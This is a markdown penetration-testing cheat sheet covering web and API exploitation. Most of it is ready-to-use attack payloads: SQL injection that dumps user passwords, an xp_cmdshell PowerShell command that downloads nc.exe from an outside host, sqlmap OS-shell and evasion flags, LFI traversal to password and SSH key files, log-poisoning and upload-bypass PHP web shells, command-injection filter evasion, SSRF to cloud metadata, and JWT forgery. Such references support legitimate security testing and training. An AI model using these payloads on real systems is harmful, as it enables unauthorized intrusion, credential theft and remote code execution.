# 02 - Web Application & API Security Testing

[⬅️ Back to Master Index](README.md)

---

## 📌 1. Web Reconnaissance & Directory Fuzzing

Locating hidden administrative panels, API endpoints, backup files, and unprotected upload forms is the bedrock of external web exploitation.

### Directory & File Fuzzing with FFUF
```bash
# High-speed directory discovery
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404

# File extension discovery (searching for backups, configs, and scripts)
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.html,.txt,.bak,.zip,.old,.json -fc 404 -o ffuf_files.json

# Filtering out specific false-positive response sizes (e.g., custom 200 error pages)
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 3142
```

### Parameter Fuzzing
```bash
# Fuzzing GET parameters
ffuf -u "http://$TARGET/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234

# Fuzzing POST parameters
ffuf -u "http://$TARGET/api/login" -X POST -d "FUZZ=admin" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 240
```

### Virtual Host (VHost) Fuzzing
```bash
ffuf -u http://$TARGET -H "Host: FUZZ.target.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1512
```

---

## 💉 2. SQL Injection (Manual & Automated)

### Step-by-Step Manual UNION-Based SQLi
When a parameter is vulnerable to SQL injection:

#### 1. Determine the Number of Columns:
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- Error indicates table has 2 columns!
```

#### 2. Determine Which Columns are String-Compatible:
```sql
' UNION SELECT 'a', 'b'-- -
' UNION SELECT 1, 2, 3-- -
```

#### 3. Extract Database Metadata (MySQL / MariaDB):
```sql
-- Extract Current Database and User
' UNION SELECT user(), database()-- -

-- Extract All Table Names
' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -

-- Extract Column Names for Target Table (e.g., 'users')
' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -

-- Dump Sensitive Data (username and password)
' UNION SELECT 1, group_concat(username, 0x3a, password) FROM users-- -
```

#### 4. Extract Database Metadata (MSSQL):
```sql
-- Extract Database & Version
' UNION SELECT @@version, db_name()-- -

-- Extract Table Names
' UNION SELECT 1, table_name FROM master.information_schema.tables-- -

-- Read System Commands (if xp_cmdshell is accessible)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://192.168.100.5/nc.exe -OutFile C:\nc.exe"';--
```

### Automated SQLMap Workflow
```bash
# Capture full HTTP request from Burp Suite into req.txt
sqlmap -r req.txt --batch --dbs

# Target specific database and dump tables
sqlmap -r req.txt -D app_db --tables --batch

# Dump specific table contents
sqlmap -r req.txt -D app_db -T users --dump

# Execute OS commands or spawn interactive OS shell
sqlmap -r req.txt --os-shell

# Useful SQLMap evasion flags
sqlmap -r req.txt --tamper=space2comment,between,randomcase --random-agent --level 3 --risk 2
```

---

## 📂 3. Local File Inclusion (LFI) to Remote Code Execution (RCE)

### Traversal Payloads & Filter Evasion
```text
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%2fpasswd
/etc/passwd%00.php                   # (PHP < 5.3.4 null-byte termination)
```

### High-Value System Files to Inspect:
- **Linux**:
  - `/etc/passwd`, `/etc/hosts`, `/etc/resolv.conf`
  - `/proc/self/cmdline` (Command that launched current process)
  - `/proc/self/environ` (Environment variables, sometimes contains secrets)
  - `/var/log/apache2/access.log` or `/var/log/nginx/access.log`
  - `/var/log/auth.log` (SSH authentication log)
  - `/home/<user>/.bash_history`, `/home/<user>/.ssh/id_rsa`
- **Windows**:
  - `C:\Windows\System32\drivers\etc\hosts`
  - `C:\Windows\win.ini`
  - `C:\inetpub\wwwroot\web.config`

### LFI to RCE Execution Methods

#### 1. PHP Filter Wrapper (Source Code Disclosure):
```text
http://$TARGET/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
*Decode with `echo "<base64_string>" | base64 -d` to read database credentials.*

#### 2. PHP Data Wrapper:
```text
http://$TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

#### 3. Apache/Nginx Access Log Poisoning:
1. Send a request to the web server with PHP payload in the `User-Agent`:
   ```bash
   curl -A "<?php system(\$_GET['cmd']); ?>" http://$TARGET/index.php
   ```
2. Trigger execution via the LFI parameter pointing to the access log:
   ```text
   http://$TARGET/index.php?page=/var/log/apache2/access.log&cmd=id
   ```

#### 4. SSH Log Poisoning:
1. Connect via SSH using a PHP payload as the username:
   ```bash
   ssh '<?php system($_GET["c"]); ?>'@$TARGET
   ```
2. Include the authentication log:
   ```text
   http://$TARGET/index.php?page=/var/log/auth.log&c=id
   ```

---

## 📤 4. Unrestricted File Upload Bypasses

When testing file upload functionality:

### 1. Client-Side & MIME-Type Tampering
In Burp Suite Repeater, ensure the `Content-Type` header reflects an allowed image type:
```http
POST /upload.php HTTP/1.1
Host: 192.168.100.15
Content-Type: multipart/form-data; boundary=---------------------------12345

-----------------------------12345
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
-----------------------------12345--
```

### 2. Magic Byte Insertion
Prepend valid image header bytes to bypass content-inspection checks:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### 3. Extension Obfuscation Techniques
- **Alternate PHP Extensions**: `.php3`, `.php4`, `.php5`, `.phtml`, `.pht`, `.phar`, `.pgif`
- **Case Variation**: `.pHp`, `.PhP`, `.PHTML`
- **Double Extensions**: `exploit.php.jpg`, `exploit.php.png`
- **Reverse Double Extensions**: `exploit.jpg.php`
- **Null Byte Injection (Legacy)**: `exploit.php%00.png`
- **Trailing Characters (Windows IIS / Apache)**: `exploit.php.`, `exploit.php::$DATA`, `exploit.php `

### 4. Overriding Server Configuration (`.htaccess`)
If `.htaccess` uploads are permitted, upload a custom configuration file:
```apache
AddType application/x-httpd-php .pwn
```
Then upload `payload.pwn` containing PHP code to trigger execution.

---

## ⚡ 5. OS Command Injection & Filter Evasion

When an application invokes system utilities (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec`):

### Separators & Chaining Characters
```text
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id %0a
```

### Space Filter Bypasses
```bash
# Using Internal Field Separator
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# Using Redirection
cat</etc/passwd

# Using Curly Braces
{cat,/etc/passwd}
```

### Blacklisted Command Bypasses
```bash
# Character Concat & Quotes
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Wildcard Expansion
/bin/c?t /etc/pa??wd
/bin/n* -lvnp 4444

# Base64 Decoding on the Fly
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```

---

## 🌐 6. Server-Side Request Forgery (SSRF) & API Security

### SSRF Exploitation Workflow
When a web app fetches remote resources (e.g., URL previews, PDF generators, webhook testers):
1. **Probe Localhost Ports**:
   ```text
   http://127.0.0.1:80
   http://127.0.0.1:8080
   http://127.0.0.1:3306
   http://localhost:22
   ```
2. **Probe Internal Pivot Subnets**:
   ```text
   http://192.168.200.10:80/admin
   ```
3. **Cloud Metadata Endpoints (AWS / GCP / Azure)**:
   ```text
   http://169.254.169.254/latest/meta-data/
   http://metadata.google.internal/computeMetadata/v1/
   ```

### JSON Web Token (JWT) Quick Tests
1. **Algorithm "None" Attack**: Modify header from `{"alg": "HS256"}` to `{"alg": "none"}`, remove signature block (keep trailing dot).
2. **Secret Brute-Force**:
   ```bash
   jwt-tool <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
   ```
3. **Tamper Claims**: If secret is cracked, forge token with `"role": "admin"`.
